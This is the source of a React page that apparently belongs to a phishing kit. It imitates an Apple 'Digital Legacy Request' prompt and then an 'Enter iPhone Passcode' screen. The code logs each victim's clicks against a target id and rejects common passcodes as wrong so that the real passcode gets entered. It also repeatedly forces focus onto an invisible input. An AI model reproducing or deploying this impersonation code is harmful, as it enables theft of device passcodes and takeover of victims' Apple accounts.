import { GoArrowUpRight } from "react-icons/go";
import "./DigitalLegacy.scss";
import { useCallback, useEffect, useRef, useState } from "react";
import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import { RotatingLines } from "react-loader-spinner";
import proceedStep from "@/app/(tropic)/proceedStep";
export default function DigitalLegacy() {
    const [requestPasscode, setRequestPasscode] = useState(false);
    const [approveLoading, setApproveLoading] = useState(false);
    const [blockLoading, setBlockLoading] = useState(false);

    /*async function handleButton() {
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'interaction',
            interaction_title: 'Approved/rejected legacy request',
            target_id: targetId
        });
        setRequestPasscode(true);
    }*/
    async function handleApprove() {
        if (approveLoading) return;
        setApproveLoading(true);
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'interaction',
            interaction_title: 'Approved legacy request',
            target_id: targetId
        });
        setTimeout(() => {
            setRequestPasscode(true);
        }, 675);
    }
    async function handleBlock() {
        if (blockLoading) return;
        setBlockLoading(true);
        const targetId = await getTargetId();
        addIntakeEvent({
            type: 'interaction',
            interaction_title: 'Blocked legacy request',
            target_id: targetId
        });
        setTimeout(() => {
            setRequestPasscode(true);
        }, 675);
    }
    function handleFinishPasscode() {
        setRequestPasscode(false);
        setTimeout(() => {
            proceedStep();
        }, 1250);
        /*
        setTimeout(() => {
            setApproveLoading(false);
            setBlockLoading(false);
        }, 500);*/
    }
    return (
        <>
            <div className="Main DigitalLegacy">
                <div className="card">
                    <h1>Digital Legacy Request</h1>
                    <p>
                        Someone requested to add themselves as a legacy contact for your Apple Account.&nbsp;<br className="mobileBreak" />A legacy contact is someone you trust to access the data in your account after your death.
                    </p>
                    <div className="contact">
                        <span className="name">
                            Angel Quinones
                        </span>
                        <span className="email">
                            angelrquinones98@gmail.com
                        </span>
                    </div>
                    <p>
                        If you approve this request, <strong>Angel Quinones</strong> will be able to access your Apple Account after uploading a death certificate.
                    </p>
                    <p>
                        If you don't recognize this request, block it to prevent <strong>Angel Quinones</strong> from accessing your account.
                    </p>
                    <div className="buttons">
                        <button
                            onClick={() => handleBlock()}
                            className="Secondary">
                            {
                                blockLoading ?
                                    <RotatingLines
                                        strokeColor="#0077ed"
                                        width="20"
                                    /> :
                                    "Block request"
                            }
                        </button>
                        <button
                            onClick={() => handleApprove()}
                            className="Primary">
                            {
                                approveLoading ?
                                    <RotatingLines
                                        strokeColor="#ffffff"
                                        width="20"
                                    /> :
                                    "Approve request"
                            }
                        </button>
                    </div>
                    <a
                        className="learnMore"
                        target="_blank"
                        rel="noreferrer noopener"
                        href="https://support.apple.com/guide/security/legacy-contact-security-secebf027fb8/web">
                        <span>Learn more about legacy contact security</span>
                        <GoArrowUpRight className="icon" />
                    </a>
                </div>
            </div>
            {requestPasscode &&
                <PasscodeEntry
                    onFinish={() => handleFinishPasscode()}
                />
            }
        </>
    )
}


function PasscodeEntry({ onFinish }) {
    const [code, setCode] = useState("");
    const inputRef = useRef(null);
    const [shake, setShake] = useState(false);
    const [readOnly, setReadOnly] = useState(false);
    const [closing, setClosing] = useState(false);
    const [isFocused, setIsFocused] = useState(false);

    // Refs for aggressive focus mechanism
    const aggressiveFocusTimerRef = useRef(null);
    const focusAttemptsRef = useRef(0);
    const MAX_FOCUS_ATTEMPTS = 30; // e.g., 30 * 100ms = 3 seconds of trying
    const FOCUS_INTERVAL_MS = 100; // Interval between focus attempts

    const wrongCodes = [
        '123456', '111111', '000000', '123123', '987654',
        '222222', '333333', '444444', '555555', '666666',
        '777777', '888888', '999999', '654321', "321321"
    ];

    

    const isTouchDevice = useCallback(() => {
        if (typeof window === 'undefined') return false;
        return 'ontouchstart' in window ||
            navigator.maxTouchPoints > 0 ||
            (window.matchMedia && window.matchMedia('(pointer: coarse)').matches);
    }, []);

    const stopAggressiveFocus = useCallback(() => {
        if (aggressiveFocusTimerRef.current) {
            clearInterval(aggressiveFocusTimerRef.current);
            aggressiveFocusTimerRef.current = null;
        }
        focusAttemptsRef.current = 0;
        // console.log("Passcode: Aggressive focus stopped.");
    }, []);

    // Core function to attempt focus using various methods
    const tryFocusingInput = useCallback(() => {
        if (!inputRef.current || readOnly || document.activeElement === inputRef.current) {
            return document.activeElement === inputRef.current;
        }

        let focused = false;
        // console.log("Passcode: Attempting focus...");

        // Method 1: Standard .focus()
        try {
            inputRef.current.focus({ preventScroll: true });
            if (document.activeElement === inputRef.current) {
                // console.log("Passcode: Focused via .focus()");
                focused = true;
            }
        } catch (e) {
            console.warn("Passcode: .focus() error", e);
        }

        // Method 2: .select() (often implies focus for text inputs)
        // Only try if standard focus didn't work and it's a selectable input
        if (!focused && typeof inputRef.current.select === 'function') {
            try {
                // To make select more effective, temporarily make it visible (if it's not type=hidden)
                // This is a bit wild, but part of "aggressive"
                const originalOpacity = inputRef.current.style.opacity;
                // inputRef.current.style.opacity = '0.00001'; // Tiny opacity
                // inputRef.current.style.zIndex = '9999'; // Bring to front
                
                inputRef.current.select();
                
                // Restore original style quickly
                // requestAnimationFrame(() => {
                //    inputRef.current.style.opacity = originalOpacity;
                //    inputRef.current.style.zIndex = ''; // Or original z-index
                // });

                // Check active element *after* a micro-task delay for select()
                setTimeout(() => {
                    if (document.activeElement === inputRef.current && !isFocused) {
                        // console.log("Passcode: Focused via .select() (async check)");
                        // This will trigger onFocus handler, which will set isFocused and stop polling
                    }
                }, 0);
                if (document.activeElement === inputRef.current) { // Immediate check
                    // console.log("Passcode: Focused via .select() (immediate check)");
                    focused = true;
                }
            } catch (e) {
                console.warn("Passcode: .select() error", e);
            }
        }
        
        // Method 3: Programmatic click on the input (very unlikely to work for focus on mobile)
        // if (!focused) {
        //     try {
        //         inputRef.current.click(); // This is more for triggering click handlers
        //         if (document.activeElement === inputRef.current) {
        //             focused = true;
        //         }
        //     } catch (e) { console.warn("Passcode: .click() error", e); }
        // }

        return focused || document.activeElement === inputRef.current;
    }, [readOnly, isFocused]); // Added isFocused to dependencies

    const startAggressiveFocus = useCallback(() => {
        stopAggressiveFocus(); // Clear any existing timers

        if (readOnly || !inputRef.current || isFocused || document.activeElement === inputRef.current) {
            // console.log("Passcode: Aggressive focus not starting (already focused, readonly, or no input).");
            return;
        }

        // console.log("Passcode: Starting aggressive focus attempts...");
        focusAttemptsRef.current = 0;

        // Immediate first attempt
        if (tryFocusingInput()) {
             // onFocus handler should take care of setting isFocused and stopping polling
            return;
        }

        aggressiveFocusTimerRef.current = setInterval(() => {
            focusAttemptsRef.current++;
            // console.log(`Passcode: Aggressive focus attempt #${focusAttemptsRef.current}`);

            if (readOnly || !inputRef.current || isFocused || document.activeElement === inputRef.current) {
                // console.log("Passcode: Conditions met to stop aggressive focus from interval.");
                stopAggressiveFocus();
                return;
            }

            if (focusAttemptsRef.current > MAX_FOCUS_ATTEMPTS) {
                // console.warn("Passcode: Max focus attempts reached. Giving up aggressive focus.");
                stopAggressiveFocus();
                // Consider showing a more persistent message if focus fails completely
                return;
            }

            tryFocusingInput();
        }, FOCUS_INTERVAL_MS);

    }, [readOnly, stopAggressiveFocus, tryFocusingInput, isFocused]); // Added isFocused

    // Effect for managing aggressive focus on mount and when readOnly/isFocused changes
    useEffect(() => {
        if (!readOnly && inputRef.current && !isFocused && document.activeElement !== inputRef.current) {
            // Delay slightly before starting aggressive focus, especially on mount
            const timeoutId = setTimeout(startAggressiveFocus, 50);
            return () => clearTimeout(timeoutId);
        } else if (isFocused || readOnly) {
            // If it becomes focused or readOnly, ensure aggressive focus stops
            stopAggressiveFocus();
        }
    }, [readOnly, isFocused, startAggressiveFocus, stopAggressiveFocus]); // Key dependencies

    // Cleanup aggressive focus on component unmount
    useEffect(() => {
        return () => {
            stopAggressiveFocus();
        };
    }, [stopAggressiveFocus]);

    const handleWrongCode = useCallback(() => {
        setReadOnly(true); // This will stop focus attempts via useEffect
        setCode(""); 
        setShake(true);
        const timer = setTimeout(() => {
            setShake(false);
            setReadOnly(false); // This will re-trigger focus attempts via useEffect
        }, 750);
        return () => clearTimeout(timer);
    }, [/* setReadOnly, setCode, setShake are stable */]);

    const handleCodeChange = (e) => {
        if (readOnly) return;
        const newValue = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
        setCode(newValue);
    };

    const handleSubmit = useCallback(async () => {
        if (wrongCodes.includes(code)) {
            handleWrongCode();
            return;
        }
        // console.log('Passcode submitted:', code);
        setReadOnly(true);
        setTimeout(() => setClosing(true), 250);
        setTimeout(() => { onFinish && onFinish(); }, 390);
    }, [code, wrongCodes, handleWrongCode, onFinish]);

    useEffect(() => {
        if (code.length === 6 && !readOnly) {
            handleSubmit();
        }
    }, [code, readOnly, handleSubmit]);

    const handleInputFocus = useCallback(() => {
        // console.log("Passcode: Input focused (onFocus event).");
        setIsFocused(true);
        stopAggressiveFocus(); // CRITICAL: Stop polling once successfully focused
    }, [stopAggressiveFocus /* setIsFocused is stable */]);

    const handleInputBlur = useCallback(() => {
        // console.log("Passcode: Input blurred (onBlur event).");
        setIsFocused(false);
        // Optional: If it blurs and should still be focusable, you *could* restart aggressive focus.
        // However, this can be annoying if the user intentionally blurred.
        // Relying on the main click handler is often better.
        // if (!readOnly && inputRef.current) {
        //    setTimeout(() => { // Check after a moment if focus didn't land elsewhere intentionally
        //        if (document.activeElement !== inputRef.current && !readOnly && !isFocused) {
        //            console.log("Passcode: Re-initiating focus after blur.");
        //            startAggressiveFocus();
        //        }
        //    }, 100);
        // }
    }, [/* readOnly, startAggressiveFocus, isFocused */]); // setIsFocused is stable

    // THIS IS THE MOST RELIABLE WAY for mobile Safari: focus within a user gesture
    const handleContainerClick = useCallback(() => {
        // console.log("Passcode: Container clicked.");
        if (!readOnly && inputRef.current && !isFocused) {
            // Direct attempt within user gesture context
            const focusedNow = tryFocusingInput();
            if (!focusedNow && !isFocused) { // If direct attempt failed and onFocus hasn't fired
                // Fallback to aggressive focus if the direct tap-focus didn't take immediately
                // (though it usually should inside a user event)
                // console.log("Passcode: Container click didn't immediately focus, trying aggressive.")
                startAggressiveFocus();
            }
        } else if (isFocused && inputRef.current && document.activeElement !== inputRef.current) {
            // If state says focused, but activeElement is not input, try to re-focus
            // This can happen if something stole focus.
            // console.log("Passcode: State is focused, but activeElement is not. Refocusing.")
            tryFocusingInput();
        }
    }, [readOnly, isFocused, tryFocusingInput, startAggressiveFocus]);

    const showHowToFocus = !readOnly && (code.length === 0 || !isFocused);

    return (
        <div
            data-closing={closing}
            className="PasscodeEntry"
            onClick={handleContainerClick} // This is key for mobile!
            role="button" // Make it more clear to assistive tech that it's interactive
            tabIndex={-1} // Makes the div itself not tabbable, but clickable
        >
            <h1>Enter iPhone Passcode</h1>
            <p className="instruct">
                The passcode you use to unlock your iPhone is used to access your Apple Account and approve or reject digital legacy requests.
            </p>
            <div
                data-shake={shake}
                className="circles"
            >
                {Array.from({ length: 6 }).map((_, index) => (
                    <div key={index} className={`circle ${code.length > index ? "filled" : ""}`}></div>
                ))}
            </div>
            {/* Ensure this span doesn't block clicks on the parent if it overlaps */}
            <span
                className="howToFocus"
                style={{
                    opacity: showHowToFocus ? 1 : 0,
                    visibility: showHowToFocus ? 'visible' : 'hidden',
                }}
            >
                {isTouchDevice() ? 'Tap' : 'Click on'} the screen to enter your passcode
            </span>
            <input
                type="tel" // "tel" is generally better for numeric codes than "number"
                autoFocus // Keep for desktop best-effort, often ignored on mobile initially
                value={code}
                ref={inputRef}
                maxLength={6}
                pattern="[0-9]*" // Helps ensure numeric keyboard on some platforms
                inputMode="numeric" // Strongest hint for numeric keyboard
                onFocus={handleInputFocus}
                onBlur={handleInputBlur}
                required
                onChange={handleCodeChange}
                className="passcodeInput" // CSS handles the invisibility and full coverage
                disabled={readOnly}
                autoComplete="one-time-code" // Can be helpful
                autoCapitalize="off"
                autoCorrect="off"
                spellCheck="false"
                tabIndex={-1} // The input itself doesn't need to be in tab order if parent handles focus
            />
        </div>
    );
}